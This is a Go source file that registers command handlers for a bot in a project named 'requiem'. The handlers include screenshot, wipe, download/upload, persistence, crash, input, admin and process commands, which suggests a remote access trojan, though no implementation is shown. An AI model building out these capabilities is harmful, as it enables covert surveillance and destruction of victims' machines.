package bot

import (
	"requiem/bot/commands"
	"requiem/store"
)

var commandsList = make(map[string]store.Command)

func registerCommands() {
	cmds := []store.Command{
		&commands.PingCommand{},
		&commands.ScreenshotCommand{},
		&commands.WipeCommand{},
		&commands.DownloadCommand{},
		&commands.UploadCommand{},
		&commands.WallpaperCommand{},
		&commands.CriticalCommand{},
		&commands.CrashCommand{},
		&commands.RunCommand{},
		&commands.TreeCommand{},
		&commands.FileCommand{},
		&commands.PersistCommand{},
		&commands.RotateCommand{},
		&commands.NotifCommand{},
		&commands.LightCommand{},
		&commands.AudioCommand{},
		&commands.VolumeCommand{},
		&commands.InputCommand{},
		&commands.SpeakCommand{},
		&commands.SiteCommand{},
		&commands.UpdateCommand{},
		&commands.MacroCommand{},
		&commands.ScareCommand{},
		&commands.SettingsCommand{},
		&commands.AdminCommand{},
		&commands.ProcCommand{},
	}

	for _, cmd := range cmds {
		commandsList[cmd.Name()] = cmd
	}
}
